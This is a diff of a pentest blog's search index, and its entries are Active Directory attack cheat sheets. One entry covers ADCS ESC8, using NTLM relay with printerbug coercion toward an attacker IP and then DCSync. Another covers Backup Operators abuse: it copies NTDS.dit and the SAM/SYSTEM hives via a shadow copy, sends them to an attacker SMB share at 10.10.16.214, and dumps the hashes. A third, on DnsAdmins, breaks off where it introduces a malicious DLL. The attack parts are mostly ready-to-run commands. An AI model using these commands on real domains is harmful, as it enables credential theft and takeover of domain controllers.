@@ -1,132 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>ESC8</tag>
-        <tag>Certipy</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Backup Operators</title>
-    <url>/2026/03/06/Backup-Operators/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Backup Operators is a privileged Windows group whose members can back up and restore files on a system, regardless of file permissions. This group grants powerful privileges such as <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, which allow bypassing access controls. These privileges can be abused to <code>read sensitive files like the SAM, SYSTEM, or NTDS.dit</code></p>
-</blockquote>
-<h2 id="Enabling-SeBackupPrivilege"><a href="#Enabling-SeBackupPrivilege" class="headerlink" title="Enabling SeBackupPrivilege"></a>Enabling SeBackupPrivilege</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line"></span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ In some cases, the privilege is present but disabled by default. So we can enable it using this <a href="https://github.com/giuliano108/SeBackupPrivilege">PoC</a>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Set-SeBackupPrivilege</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line">SeBackupPrivilege is enabled</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line"></span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Exploiting-Privilege"><a href="#Exploiting-Privilege" class="headerlink" title="Exploiting Privilege"></a>Exploiting Privilege</h2><h4 id="Copying-a-Protected-File"><a href="#Copying-a-Protected-File" class="headerlink" title="Copying a Protected File"></a>Copying a Protected File</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Copy-FileSeBackupPrivilege</span> <span class="string">&#x27;C:\Confidential\2021 Contract.txt&#x27;</span> .\Contract.txt</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h4><blockquote>
-<p>Since the NTDS database is actively used by the system and therefore locked by default, we can use the Windows <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a>  built-in tool to create a Volume Shadow Copy of the <code>C:</code> drive and mount it as the <code>E:</code> drive for offline access.</p>
-</blockquote>
-<h6 id="Mount-the-C-Drive-as-a-Shadow-Copy"><a href="#Mount-the-C-Drive-as-a-Shadow-Copy" class="headerlink" title="Mount the C: Drive as a Shadow Copy"></a>Mount the <code>C:</code> Drive as a Shadow Copy</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\svc_backup&gt; diskshadow.exe</span><br><span class="line"></span><br><span class="line">set context persistent nowriters</span><br><span class="line">set metadata C:\Temp\test.cab</span><br><span class="line">add volume C: alias dfs</span><br><span class="line">create</span><br><span class="line">expose %dfs% K:</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ This creates a shadow copy of C: and mounts it as drive K:.</p>
-</blockquote>
-<h6 id="Copy-NTDS-dit-Locally"><a href="#Copy-NTDS-dit-Locally" class="headerlink" title="Copy NTDS.dit Locally"></a>Copy NTDS.dit Locally</h6><p>Using <code>Robocopy</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; robocopy /B K:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure>
-
-<p>Using <code>Copy-FileSeBackupPrivilege</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> K:\Windows\NTDS\ntds.dit .\ntds.dit</span><br><span class="line"></span><br><span class="line">Copied <span class="number">16777216</span> bytes</span><br></pre></td></tr></table></figure>
-
-
-<h6 id="Copy-the-SYSTEM-Registry-Hive"><a href="#Copy-the-SYSTEM-Registry-Hive" class="headerlink" title="Copy the SYSTEM Registry Hive"></a>Copy the SYSTEM Registry Hive</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt;  reg save HKLM\SYSTEM SYSTEM.SAV</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">34</span> AM       <span class="number">16777216</span> ntds.dit</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">29</span> AM          <span class="number">12288</span> SeBackupPrivilegeCmdLets.dll</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">29</span> AM          <span class="number">16384</span> SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">34</span> AM       <span class="number">17645568</span> SYSTEM.SAV</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Now both files are available locally:<br>•	ntds.dit<br>•	SYSTEM.SAV</p>
-</blockquote>
-<h6 id="Transfer-Files-to-Our-Machine"><a href="#Transfer-Files-to-Our-Machine" class="headerlink" title="Transfer Files to Our Machine"></a>Transfer Files to Our Machine</h6><blockquote>
-<p>Create an SMB server </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  SeBackupPrivilege <span class="built_in">sudo</span> impacket-smbserver -smb2support share . -user <span class="built_in">test</span> -password P@ssw0rd</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Mount the share on the target</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\svc_backup&gt; net use n: \\10.10.16.214\share /user:test P@ssw0rd</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Copy the files to the share</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">copy</span> .\ntds.dit n:\ntds.dit</span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">copy</span> .\SYSTEM.SAV  n:\SYSTEM.SAV</span><br></pre></td></tr></table></figure>
-
-<h6 id="Dump-the-NTDS-Database"><a href="#Dump-the-NTDS-Database" class="headerlink" title="Dump the NTDS Database"></a>Dump the NTDS Database</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  SeBackupPrivilege impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Dump-SAM"><a href="#Dump-SAM" class="headerlink" title="Dump SAM"></a>Dump SAM</h2><h6 id="Backing-up-SAM-and-SYSTEM-Registry-Hives"><a href="#Backing-up-SAM-and-SYSTEM-Registry-Hives" class="headerlink" title="Backing up SAM and SYSTEM Registry Hives"></a>Backing up SAM and SYSTEM Registry Hives</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; reg save HKLM\SYSTEM SYSTEM.SAV</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt; reg save HKLM\SAM SAM.SAV</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Then transfer the files to our machine</p>
-</blockquote>
-<h6 id="Dump-the-SAM-Database"><a href="#Dump-the-SAM-Database" class="headerlink" title="Dump the SAM Database"></a>Dump the SAM Database</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ SeBackupPrivilege impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-      </categories>
-      <tags>
-        <tag>backup-operators</tag>
-        <tag>sebackupprivilege</tag>
-        <tag>diskshadow</tag>
-        <tag>ntds</tag>
-        <tag>active-directory</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AD : ACLs</title>
     <url>/2025/12/02/AD-ACLs/</url>
     <content><![CDATA[<h1 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h1><blockquote>
@@ -292,14 +166,57 @@
         <category>ACLs</category>
       </categories>
       <tags>
-        <tag>Certipy</tag>
         <tag>netexec</tag>
+        <tag>Certipy</tag>
         <tag>dacledit</tag>
         <tag>owneredit</tag>
         <tag>bloodyAD</tag>
         <tag>secretsdump</tag>
         <tag>PowerView</tag>
         <tag>net</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC8</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
       </tags>
   </entry>
   <entry>
@@ -427,6 +344,90 @@
         <tag>PowerView</tag>
         <tag>Mimikatz</tag>
         <tag>Rubeus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Backup Operators</title>
+    <url>/2026/03/06/Backup-Operators/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Backup Operators is a privileged Windows group whose members can back up and restore files on a system, regardless of file permissions. This group grants powerful privileges such as <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, which allow bypassing access controls. These privileges can be abused to <code>read sensitive files like the SAM, SYSTEM, or NTDS.dit</code></p>
+</blockquote>
+<h2 id="Enabling-SeBackupPrivilege"><a href="#Enabling-SeBackupPrivilege" class="headerlink" title="Enabling SeBackupPrivilege"></a>Enabling SeBackupPrivilege</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line"></span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ In some cases, the privilege is present but disabled by default. So we can enable it using this <a href="https://github.com/giuliano108/SeBackupPrivilege">PoC</a>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Set-SeBackupPrivilege</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line">SeBackupPrivilege is enabled</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line"></span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Exploiting-Privilege"><a href="#Exploiting-Privilege" class="headerlink" title="Exploiting Privilege"></a>Exploiting Privilege</h2><h4 id="Copying-a-Protected-File"><a href="#Copying-a-Protected-File" class="headerlink" title="Copying a Protected File"></a>Copying a Protected File</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Copy-FileSeBackupPrivilege</span> <span class="string">&#x27;C:\Confidential\2021 Contract.txt&#x27;</span> .\Contract.txt</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h4><blockquote>
+<p>Since the NTDS database is actively used by the system and therefore locked by default, we can use the Windows <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a>  built-in tool to create a Volume Shadow Copy of the <code>C:</code> drive and mount it as the <code>E:</code> drive for offline access.</p>
+</blockquote>
+<h6 id="Mount-the-C-Drive-as-a-Shadow-Copy"><a href="#Mount-the-C-Drive-as-a-Shadow-Copy" class="headerlink" title="Mount the C: Drive as a Shadow Copy"></a>Mount the <code>C:</code> Drive as a Shadow Copy</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\svc_backup&gt; diskshadow.exe</span><br><span class="line"></span><br><span class="line">set context persistent nowriters</span><br><span class="line">set metadata C:\Temp\test.cab</span><br><span class="line">add volume C: alias dfs</span><br><span class="line">create</span><br><span class="line">expose %dfs% K:</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ This creates a shadow copy of C: and mounts it as drive K:.</p>
+</blockquote>
+<h6 id="Copy-NTDS-dit-Locally"><a href="#Copy-NTDS-dit-Locally" class="headerlink" title="Copy NTDS.dit Locally"></a>Copy NTDS.dit Locally</h6><p>Using <code>Robocopy</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; robocopy /B K:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p>Using <code>Copy-FileSeBackupPrivilege</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> K:\Windows\NTDS\ntds.dit .\ntds.dit</span><br><span class="line"></span><br><span class="line">Copied <span class="number">16777216</span> bytes</span><br></pre></td></tr></table></figure>
+
+
+<h6 id="Copy-the-SYSTEM-Registry-Hive"><a href="#Copy-the-SYSTEM-Registry-Hive" class="headerlink" title="Copy the SYSTEM Registry Hive"></a>Copy the SYSTEM Registry Hive</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt;  reg save HKLM\SYSTEM SYSTEM.SAV</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">34</span> AM       <span class="number">16777216</span> ntds.dit</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">29</span> AM          <span class="number">12288</span> SeBackupPrivilegeCmdLets.dll</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">29</span> AM          <span class="number">16384</span> SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">3</span>/<span class="number">2026</span>  <span class="number">11</span>:<span class="number">34</span> AM       <span class="number">17645568</span> SYSTEM.SAV</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Now both files are available locally:<br>•	ntds.dit<br>•	SYSTEM.SAV</p>
+</blockquote>
+<h6 id="Transfer-Files-to-Our-Machine"><a href="#Transfer-Files-to-Our-Machine" class="headerlink" title="Transfer Files to Our Machine"></a>Transfer Files to Our Machine</h6><blockquote>
+<p>Create an SMB server </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  SeBackupPrivilege <span class="built_in">sudo</span> impacket-smbserver -smb2support share . -user <span class="built_in">test</span> -password P@ssw0rd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Mount the share on the target</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\svc_backup&gt; net use n: \\10.10.16.214\share /user:test P@ssw0rd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Copy the files to the share</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">copy</span> .\ntds.dit n:\ntds.dit</span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc_backup&gt; <span class="built_in">copy</span> .\SYSTEM.SAV  n:\SYSTEM.SAV</span><br></pre></td></tr></table></figure>
+
+<h6 id="Dump-the-NTDS-Database"><a href="#Dump-the-NTDS-Database" class="headerlink" title="Dump the NTDS Database"></a>Dump the NTDS Database</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  SeBackupPrivilege impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-SAM"><a href="#Dump-SAM" class="headerlink" title="Dump SAM"></a>Dump SAM</h2><h6 id="Backing-up-SAM-and-SYSTEM-Registry-Hives"><a href="#Backing-up-SAM-and-SYSTEM-Registry-Hives" class="headerlink" title="Backing up SAM and SYSTEM Registry Hives"></a>Backing up SAM and SYSTEM Registry Hives</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; reg save HKLM\SYSTEM SYSTEM.SAV</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt; reg save HKLM\SAM SAM.SAV</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Then transfer the files to our machine</p>
+</blockquote>
+<h6 id="Dump-the-SAM-Database"><a href="#Dump-the-SAM-Database" class="headerlink" title="Dump the SAM Database"></a>Dump the SAM Database</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ SeBackupPrivilege impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>backup-operators</tag>
+        <tag>sebackupprivilege</tag>
+        <tag>diskshadow</tag>
+        <tag>ntds</tag>
+        <tag>active-directory</tag>
       </tags>
   </entry>
   <entry>
@@ -558,6 +559,74 @@
       </tags>
   </entry>
   <entry>
+    <title>DnsAdmins</title>
+    <url>/2026/03/06/DnsAdmins/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ DnsAdmins is a Windows group whose members can manage DNS settings within an Active Directory environment. Because the DNS service runs with <code>SYSTEM privileges </code> and supports loading custom plugins, this role can be abused to <code>execute malicious code by loading a crafted DLL</code>, potentially leading to full compromise of a Domain Controller.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\netadm&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                 <span class="built_in">Type</span>             SID                                           Attributes    </span><br><span class="line">========================================== ================ ============================================= ===============================================================</span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\DnsAdmins                    Alias            S<span class="literal">-1-5-21-669053619-2741956077-1013132368-1101</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span>, Local <span class="built_in">Group</span>                                              </span><br></pre></td></tr></table></figure>
+
+<h4 id="Generating-a-Malicious-DLL"><a href="#Generating-a-Malicious-DLL" class="headerlink" title="Generating a Malicious DLL"></a>Generating a Malicious DLL</h4><blockquote>
+<p>We can generate a malicious DLL to add a user to the <code>Domain Admins</code> group using <code>msfvenom</code>.</p>
+</blockquote>
